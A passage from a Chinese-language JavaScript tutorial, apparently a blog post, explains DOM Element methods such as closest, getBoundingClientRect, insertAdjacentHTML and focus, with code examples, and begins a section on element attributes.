<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;red test&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>注意，该方法的参数大小写敏感。</p>
<p>由于<code>HTMLCollection</code>实例是一个<strong>活的集合</strong>，<code>document</code>对象的任何变化会立刻反应到实例，下面的代码不会生效。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;example&quot;&gt;</span></span><br><span class="line"><span class="comment">//   &lt;p class=&quot;foo&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">//   &lt;p class=&quot;foo&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;example&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> matches = element.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i&lt; matches.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  matches[i].<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;foo&#x27;</span>); <span class="comment">// 当删除了foo，matches的集合就会立刻改变</span></span><br><span class="line">  matches.<span class="title function_">item</span>(i).<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;bar&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行后，HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;example&quot;&gt;</span></span><br><span class="line"><span class="comment">//   &lt;p&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">//   &lt;p class=&quot;foo bar&quot;&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>matches</code>集合的第一个成员，<strong>一旦被拿掉 class 里面的<code>foo</code>，就会立刻从<code>matches</code>里面消失</strong>，导致出现上面的结果。</p>
<h4 id="2-5-Element-getElementsByTagName-通过标签获取索引子元素"><a href="#2-5-Element-getElementsByTagName-通过标签获取索引子元素" class="headerlink" title="2.5 Element.getElementsByTagName() 通过标签获取索引子元素"></a>2.5 Element.getElementsByTagName() 通过标签获取索引子元素</h4><p><code>Element.getElementsByTagName</code>方法<strong>返回一个<code>HTMLCollection</code>实例，成员是当前节点的所有匹配指定标签名的子元素节点</strong>。该方法与<code>document.getElementsByClassName</code>方法的用法类似，只是搜索范围不是整个文档，而是当前元素节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> table = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;forecast-table&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cells = table.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;td&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>注意，该方法的参数是大小写不敏感的。</p>
<h4 id="2-6-Element-closest-接受CSS选择器参数，返回最靠近的祖先节点"><a href="#2-6-Element-closest-接受CSS选择器参数，返回最靠近的祖先节点" class="headerlink" title="2.6 Element.closest() 接受CSS选择器参数，返回最靠近的祖先节点"></a>2.6 Element.closest() 接受CSS选择器参数，返回最靠近的祖先节点</h4><p><code>Element.closest</code>方法<strong>接受一个 CSS 选择器作为参数，返回匹配该选择器的、最接近当前节点的一个祖先节点（包括当前节点本身）</strong>。如果没有任何节点匹配 CSS 选择器，则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;article&gt;</span></span><br><span class="line"><span class="comment">//   &lt;div id=&quot;div-01&quot;&gt;Here is div-01</span></span><br><span class="line"><span class="comment">//     &lt;div id=&quot;div-02&quot;&gt;Here is div-02</span></span><br><span class="line"><span class="comment">//       &lt;div id=&quot;div-03&quot;&gt;Here is div-03&lt;/div&gt;</span></span><br><span class="line"><span class="comment">//     &lt;/div&gt;</span></span><br><span class="line"><span class="comment">//   &lt;/div&gt;</span></span><br><span class="line"><span class="comment">// &lt;/article&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div03 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div-03&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// div-03 最近的祖先节点</span></span><br><span class="line">div03.<span class="title function_">closest</span>(<span class="string">&quot;#div-02&quot;</span>) <span class="comment">// div-02</span></span><br><span class="line"></span><br><span class="line">div03.<span class="title function_">closest</span>(<span class="string">&quot;div&quot;</span>) <span class="comment">// div-03 closest包含当前节点本身</span></span><br><span class="line">div03.<span class="title function_">closest</span>(<span class="string">&quot;div div&quot;</span>) <span class="comment">// div-03</span></span><br><span class="line">div03.<span class="title function_">closest</span>(<span class="string">&quot;div&gt;div&quot;</span>) <span class="comment">// div-03</span></span><br><span class="line"></span><br><span class="line">div03.<span class="title function_">closest</span>(<span class="string">&quot;article &gt; div&quot;</span>) <span class="comment">//div-01</span></span><br><span class="line">div03.<span class="title function_">closest</span>(<span class="string">&quot;:not(div)&quot;</span>) <span class="comment">// article</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，由于<code>closest</code>方法将当前节点也考虑在内，所以第二个<code>closest</code>方法返回<code>div-03</code>。</p>
<h4 id="2-7-Element-matches-当前元素是否匹配给定的css选择器"><a href="#2-7-Element-matches-当前元素是否匹配给定的css选择器" class="headerlink" title="2.7 Element.matches() 当前元素是否匹配给定的css选择器"></a>2.7 Element.matches() 当前元素是否匹配给定的css选择器</h4><p><code>Element.matches</code>方法<strong>返回一个布尔值，表示当前元素是否匹配给定的 CSS 选择器。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (el.<span class="title function_">matches</span>(<span class="string">&#x27;.someClass&#x27;</span>)) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Match!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="2-8-事件相关方法"><a href="#2-8-事件相关方法" class="headerlink" title="2.8 事件相关方法"></a>2.8 事件相关方法</h4><p>以下三个方法与<code>Element</code>节点的事件相关。这些方法都继承自<code>EventTarget</code>接口，<strong>详见相关章节</strong>。</p>
<h5 id="（1）Element-addEventListener-：添加事件的回调函数"><a href="#（1）Element-addEventListener-：添加事件的回调函数" class="headerlink" title="（1）Element.addEventListener()：添加事件的回调函数"></a>（1）<code>Element.addEventListener()</code>：添加事件的回调函数</h5><h5 id="（2）Element-removeEventListener-：移除事件监听函数"><a href="#（2）Element-removeEventListener-：移除事件监听函数" class="headerlink" title="（2）Element.removeEventListener()：移除事件监听函数"></a>（2）<code>Element.removeEventListener()</code>：移除事件监听函数</h5><h5 id="（3）Element-dispatchEvent-：触发事件"><a href="#（3）Element-dispatchEvent-：触发事件" class="headerlink" title="（3）Element.dispatchEvent()：触发事件"></a>（3）<code>Element.dispatchEvent()</code>：触发事件</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, listener, <span class="literal">false</span>);</span><br><span class="line">element.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, listener, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> event = <span class="keyword">new</span> <span class="title class_">Event</span>(<span class="string">&#x27;click&#x27;</span>);</span><br><span class="line">element.<span class="title function_">dispatchEvent</span>(event);</span><br></pre></td></tr></table></figure>



<h4 id="2-9-Element-scrollIntoView-让元素滚动到浏览器可视区"><a href="#2-9-Element-scrollIntoView-让元素滚动到浏览器可视区" class="headerlink" title="2.9 Element.scrollIntoView()  让元素滚动到浏览器可视区"></a>2.9 Element.scrollIntoView()  让元素滚动到浏览器可视区</h4><p><code>Element.scrollIntoView</code>方法<strong>让当前的元素滚动到浏览器窗口的可视区域内</strong> ，类似于设置<code>window.location.hash</code>的效果。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">el.<span class="title function_">scrollIntoView</span>(); <span class="comment">// 等同于el.scrollIntoView(true)</span></span><br><span class="line">el.<span class="title function_">scrollIntoView</span>(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>该方法可以接受一个布尔值作为参数。如果为<code>true</code>，表示元素的顶部与当前区域的可见部分的顶部对齐（前提是当前区域可滚动）；如果为<code>false</code>，表示元素的底部与当前区域的可见部分的尾部对齐（前提是当前区域可滚动）。如果没有提供该参数，默认为<code>true</code>。</p>
<h4 id="2-10-Element-getBoundingClientRect-返回元素大小、位置信息的对象"><a href="#2-10-Element-getBoundingClientRect-返回元素大小、位置信息的对象" class="headerlink" title="2.10 Element.getBoundingClientRect() 返回元素大小、位置信息的对象"></a>2.10 Element.getBoundingClientRect() 返回元素大小、位置信息的对象</h4><p><code>Element.getBoundingClientRect</code>方法<strong>返回一个对象，提供当前元素节点的大小、位置等信息，基本上就是 CSS 盒状模型的所有信息</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rect = obj.<span class="title function_">getBoundingClientRect</span>();</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>getBoundingClientRect</code>方法返回的<code>rect</code>对象，具有以下属性（全部为<strong>只读</strong>）。</p>
<ul>
<li><code>x</code>：元素左上角相对于视口的横坐标</li>
<li><code>y</code>：元素左上角相对于视口的纵坐标</li>
<li><code>height</code>：元素高度</li>
<li><code>width</code>：元素宽度</li>
<li><code>left</code>：元素左上角相对于视口的横坐标，与<code>x</code>属性相等</li>
<li><code>right</code>：元素右边界相对于视口的横坐标（等于<code>x + width</code>）</li>
<li><code>top</code>：元素顶部相对于视口的纵坐标，与<code>y</code>属性相等</li>
<li><code>bottom</code>：元素底部相对于视口的纵坐标（等于<code>y + height</code>）</li>
</ul>
<p>由于元素<strong>相对于视口（viewport）的位置</strong>，<strong>会随着页面滚动变化</strong>，因此表示位置的四个属性值，都不是固定不变的。如果想得到绝对位置，可以将<code>left</code>属性加上<code>window.scrollX</code>，<code>top</code>属性加上<code>window.scrollY</code>。</p>
<p>注意，<code>getBoundingClientRect</code>方法的所有属性，都把边框（<code>border</code>属性）算作元素的一部分。也就是说，都是从边框外缘的各个点来计算。因此，**<code>width</code>和<code>height</code>包括了元素本身 + <code>padding</code> + <code>border</code>。**</p>
<p>另外，上面的这些属性，都是继承自原型的属性，<code>Object.keys</code>会返回一个空数组，这一点也需要注意。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rect = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">getBoundingClientRect</span>();</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(rect) <span class="comment">// []</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>rect</code>对象没有自身属性，而<code>Object.keys</code>方法只返回对象自身的属性，所以返回了一个空数组。</p>
<h4 id="2-11-Element-getClientRects-元素在页面上形成的所有矩形，类数组"><a href="#2-11-Element-getClientRects-元素在页面上形成的所有矩形，类数组" class="headerlink" title="2.11 Element.getClientRects() 元素在页面上形成的所有矩形，类数组"></a>2.11 Element.getClientRects() 元素在页面上形成的所有矩形，类数组</h4><p><code>Element.getClientRects</code>方法<strong>返回一个类似数组的对象，里面是当前元素在页面上形成的所有矩形</strong>（所以方法名中的<code>Rect</code>用的是复数）。每个矩形都有<code>bottom</code>、<code>height</code>、<code>left</code>、<code>right</code>、<code>top</code>和<code>width</code>六个属性，表示它们相对于视口的四个坐标，以及本身的高度和宽度。</p>
<p>对于盒状元素（比如<code> &lt;div&gt; </code>和<code> &lt;p&gt; </code>），该方法返回的对象中只有该元素一个成员。对于行内元素（比如<code>&lt;span&gt;</code>、<code> &lt;a&gt; </code>、<code>&lt;em&gt;</code>），该方法返回的对象有多少个成员，取决于该元素在页面上占据多少行。这是它和<code>Element.getBoundingClientRect()</code>方法的主要区别，后者对于行内元素总是返回一个矩形。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span id=<span class="string">&quot;inline&quot;</span>&gt;<span class="title class_">Hello</span> <span class="title class_">World</span> <span class="title class_">Hello</span> <span class="title class_">World</span> <span class="title class_">Hello</span> <span class="title class_">World</span>&lt;/span&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码是一个行内元素<code>&lt;span&gt;</code>，如果它在页面上占据三行，<code>getClientRects</code>方法返回的对象就有三个成员，如果它在页面上占据一行，<code>getClientRects</code>方法返回的对象就只有一个成员。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;inline&#x27;</span>);</span><br><span class="line">el.<span class="title function_">getClientRects</span>().<span class="property">length</span> <span class="comment">// 3</span></span><br><span class="line">el.<span class="title function_">getClientRects</span>()[<span class="number">0</span>].<span class="property">left</span> <span class="comment">// 8</span></span><br><span class="line">el.<span class="title function_">getClientRects</span>()[<span class="number">0</span>].<span class="property">right</span> <span class="comment">// 113.908203125</span></span><br><span class="line">el.<span class="title function_">getClientRects</span>()[<span class="number">0</span>].<span class="property">bottom</span> <span class="comment">// 31.200000762939453</span></span><br><span class="line">el.<span class="title function_">getClientRects</span>()[<span class="number">0</span>].<span class="property">height</span> <span class="comment">// 23.200000762939453</span></span><br><span class="line">el.<span class="title function_">getClientRects</span>()[<span class="number">0</span>].<span class="property">width</span> <span class="comment">// 105.908203125</span></span><br></pre></td></tr></table></figure>

<p>这个方法主要用于判断行内元素是否换行，以及行内元素的每一行的位置偏移。</p>
<p>注意，如果行内元素包括换行符，那么该方法会把换行符考虑在内。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;span id=<span class="string">&quot;inline&quot;</span>&gt;</span><br><span class="line">  <span class="title class_">Hello</span> <span class="title class_">World</span></span><br><span class="line">  <span class="title class_">Hello</span> <span class="title class_">World</span></span><br><span class="line">  <span class="title class_">Hello</span> <span class="title class_">World</span></span><br><span class="line">&lt;/span&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>&lt;span&gt;</code>节点内部有三个换行符，即使 HTML 语言忽略换行符，将它们显示为一行，<code>getClientRects()</code>方法依然会返回三个成员。如果行宽设置得特别窄，上面的<code>&lt;span&gt;</code>元素显示为6行，那么就会返回六个成员。</p>
<h4 id="2-12-Element-insertAdjacentElement-插入新节点到元素的指定位置"><a href="#2-12-Element-insertAdjacentElement-插入新节点到元素的指定位置" class="headerlink" title="2.12 Element.insertAdjacentElement()  插入新节点到元素的指定位置"></a>2.12 Element.insertAdjacentElement()  插入新节点到元素的指定位置</h4><p><code>Element.insertAdjacentElement</code>方法<strong>在相对于当前元素的指定位置，插入一个新的节点</strong>。该方法返回被插入的节点，如果插入失败，返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">insertAdjacentElement</span>(position, element);</span><br></pre></td></tr></table></figure>

<p><code>Element.insertAdjacentElement</code>方法一共可以接受两个参数，第一个参数是一个字符串，表示插入的位置，第二个参数是将要插入的节点。第一个参数只可以取如下的值。</p>
<ul>
<li><code>beforebegin</code>：当前元素之前</li>
<li><code>afterbegin</code>：当前元素内部的第一个子节点前面</li>
<li><code>beforeend</code>：当前元素内部的最后一个子节点后面</li>
<li><code>afterend</code>：当前元素之后</li>
</ul>
<p>注意，<code>beforebegin</code>和<code>afterend</code>这两个值，只在当前节点有父节点时才会生效。如果当前节点是由脚本创建的，没有父节点，那么插入会失败。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p1 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">p1.<span class="title function_">insertAdjacentElement</span>(<span class="string">&#x27;afterend&#x27;</span>, p2) <span class="comment">// null</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>p1</code>没有父节点，所以插入<code>p2</code>到它后面就失败了。</p>
<p>如果插入的节点是一个文档里现有的节点，它会从原有位置删除，放置到新的位置。</p>
<h4 id="2-13-Element-insertAdjacentHTML-插入html字符串到指定位置，Element-insertAdjacentText-插入text到指定位置"><a href="#2-13-Element-insertAdjacentHTML-插入html字符串到指定位置，Element-insertAdjacentText-插入text到指定位置" class="headerlink" title="2.13 Element.insertAdjacentHTML() 插入html字符串到指定位置，Element.insertAdjacentText() 插入text到指定位置"></a>2.13 Element.insertAdjacentHTML() 插入html字符串到指定位置，Element.insertAdjacentText() 插入text到指定位置</h4><p><code>Element.insertAdjacentHTML</code>方法<strong>用于将一个 HTML 字符串，解析生成 DOM 结构，插入相对于当前节点的指定位置。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">insertAdjacentHTML</span>(position, text);</span><br></pre></td></tr></table></figure>

<p>该方法接受两个参数，第一个是一个表示指定位置的字符串，第二个是待解析的 HTML 字符串。第一个参数只能设置下面四个值之一。</p>
<ul>
<li><code>beforebegin</code>：当前元素之前</li>
<li><code>afterbegin</code>：当前元素内部的第一个子节点前面</li>
<li><code>beforeend</code>：当前元素内部的最后一个子节点后面</li>
<li><code>afterend</code>：当前元素之后</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码：&lt;div id=&quot;one&quot;&gt;one&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> d1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;one&#x27;</span>);</span><br><span class="line">d1.<span class="title function_">insertAdjacentHTML</span>(<span class="string">&#x27;afterend&#x27;</span>, <span class="string">&#x27;&lt;div id=&quot;two&quot;&gt;two&lt;/div&gt;&#x27;</span>);</span><br><span class="line"><span class="comment">// 执行后的 HTML 代码：</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;one&quot;&gt;one&lt;/div&gt;&lt;div id=&quot;two&quot;&gt;two&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>

<p>该方法只是在现有的 DOM 结构里面插入节点，这使得它的执行速度比<code>innerHTML</code>方法快得多。</p>
<p>注意，该方法不会转义 HTML 字符串，这导致它不能用来插入用户输入的内容，否则会有安全风险。</p>
<p><code>Element.insertAdjacentText</code>方法在相对于当前节点的指定位置，插入一个文本节点，用法与<code>Element.insertAdjacentHTML</code>方法完全一致。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码：&lt;div id=&quot;one&quot;&gt;one&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> d1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;one&#x27;</span>);</span><br><span class="line">d1.<span class="title function_">insertAdjacentText</span>(<span class="string">&#x27;afterend&#x27;</span>, <span class="string">&#x27;two&#x27;</span>);</span><br><span class="line"><span class="comment">// 执行后的 HTML 代码：</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;one&quot;&gt;one&lt;/div&gt;two</span></span><br></pre></td></tr></table></figure>



<h4 id="2-14-Element-remove-移除元素"><a href="#2-14-Element-remove-移除元素" class="headerlink" title="2.14 Element.remove() 移除元素"></a>2.14 Element.remove() 移除元素</h4><p><code>Element.remove</code>方法<strong>继承自 ChildNode 接口，用于将当前元素节点从它的父节点移除。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line">el.<span class="title function_">remove</span>();</span><br></pre></td></tr></table></figure>

<p>上面代码将<code>el</code>节点从 DOM 树里面移除。</p>
<h4 id="2-15-Element-focus-将页面焦点转移到元素，Element-blur-将焦点移除"><a href="#2-15-Element-focus-将页面焦点转移到元素，Element-blur-将焦点移除" class="headerlink" title="2.15 Element.focus() 将页面焦点转移到元素，Element.blur() 将焦点移除"></a>2.15 Element.focus() 将页面焦点转移到元素，Element.blur() 将焦点移除</h4><p><code>Element.focus</code>方法<strong>用于将当前页面的焦点，转移到指定元素上</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;my-span&#x27;</span>).<span class="title function_">focus</span>();</span><br></pre></td></tr></table></figure>

<p>该方法可以接受一个对象作为参数。参数对象的<code>preventScroll</code>属性是一个布尔值，指定<strong>是否将当前元素停留在原始位置</strong>，而不是滚动到可见区域。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getFocus</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>).<span class="title function_">focus</span>(&#123;<span class="attr">preventScroll</span>:<span class="literal">false</span>&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码会让<code>btn</code>元素获得焦点，并<strong>滚动到可见区域</strong>。</p>
<p>最后，从<code>document.activeElement</code>属性可以得到当前获得焦点的元素。</p>
<p><code>Element.blur</code>方法<strong>用于将焦点从当前元素移除</strong>。</p>
<h4 id="2-16-Element-click-模拟点击事件"><a href="#2-16-Element-click-模拟点击事件" class="headerlink" title="2.16 Element.click() 模拟点击事件"></a>2.16 Element.click() 模拟点击事件</h4><p><code>Element.click</code>方法用于<strong>在当前元素上模拟一次鼠标点击，相当于触发了<code>click</code>事件。</strong></p>
<h2 id="七、元素属性的操作"><a href="#七、元素属性的操作" class="headerlink" title="七、元素属性的操作"></a>七、元素属性的操作</h2><p>HTML 元素包括标签名和若干个键值对，这个键值对就称为“属性”（attribute）。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://www.example.com&quot;</span>&gt;</span></span><br><span class="line">  链接</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>a</code>元素包括两个属性：<code>id</code>属性和<code>href</code>属性。</p>
<p>属性本身是一个对象（<code>Attr</code>对象），但是实际上，这个对象极少使用。一般都是通过元素节点对象（<code>HTMlElement</code>对象）来操作属性。本章介绍如何操作这些属性。</p>
<h3 id="1、Element-attributes-属性-（返回包含标签所有属性的类数组动态对象）"><a href="#1、Element-attributes-属性-（返回包含标签所有属性的类数组动态对象）" class="headerlink" title="1、Element.attributes 属性 （返回包含标签所有属性的类数组动态对象）"></a>1、Element.attributes 属性 （返回包含标签所有属性的类数组动态对象）</h3><p>元素对象有一个<code>attributes</code>属性，返回一个<strong>类似数组的动态对象，成员是该元素标签的所有属性节点对象</strong>，属性的实时变化都会反映在这个节点对象上。其他类型的节点对象，虽然也有<code>attributes</code>属性，但返回的都是<code>null</code>，因此可以把这个属性视为元素对象独有的。</p>
<p>单个属性可以通过序号引用，也可以通过属性名引用。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;a id=&quot;test&quot; href=&quot;http://www.example.com&quot;&gt;链接&lt;/a&gt;</span></span><br><span class="line"><span class="comment">// document.getElementsByTagName(&#x27;a&#x27;)[0].attributes 返回一个 NamedNodeMap 类数组对象</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">NamedNodeMap</span> &#123;<span class="number">0</span>: id, <span class="number">1</span>: href, <span class="attr">id</span>: id, <span class="attr">href</span>: href, <span class="attr">length</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这两个访问方法都是返回一个id的属性节点对象</span></span><br><span class="line"><span class="comment">// NamedNodeMap[0] </span></span><br><span class="line"><span class="comment">// NamedNodeMap.id </span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">baseURI</span>: <span class="string">&quot;file:///C:/Users/dell/Desktop/test.html&quot;</span></span><br><span class="line">    <span class="attr">childNodes</span>: <span class="title class_">NodeList</span> []</span><br><span class="line">    <span class="attr">firstChild</span>: <span class="literal">null</span></span><br><span class="line">    <span class="attr">isConnected</span>: <span class="literal">false</span></span><br><span class="line">    <span class="attr">lastChild</span>: <span class="literal">null</span></span><br><span class="line">    <span class="attr">localName</span>: <span class="string">&quot;id&quot;</span></span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;id&quot;</span> <span class="comment">// 属性是‘id’</span></span><br><span class="line">    <span class="attr">namespaceURI</span>: <span class="literal">null</span></span><br><span class="line">    <span class="attr">nextSibling</span>: <span class="literal">null</span></span><br><span class="line">    <span class="attr">nodeName</span>: <span class="string">&quot;id&quot;</span></span><br><span class="line">    <span class="attr">nodeType</span>: <span class="number">2</span></span><br><span class="line">    <span class="attr">nodeValue</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">    <span class="attr">ownerDocument</span>: <span class="variable language_">document</span></span><br><span class="line">    <span class="attr">ownerElement</span>: a#test</span><br><span class="line">    <span class="attr">parentElement</span>: <span class="literal">null</span></span><br><span class="line">    <span class="attr">parentNode</span>: <span class="literal">null</span></span><br><span class="line">    <span class="attr">prefix</span>: <span class="literal">null</span></span><br><span class="line">    <span class="attr">previousSibling</span>: <span class="literal">null</span></span><br><span class="line">    <span class="attr">specified</span>: <span class="literal">true</span></span><br><span class="line">    <span class="attr">textContent</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">    <span class="attr">value</span>: <span class="string">&quot;test&quot;</span> <span class="comment">// id的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



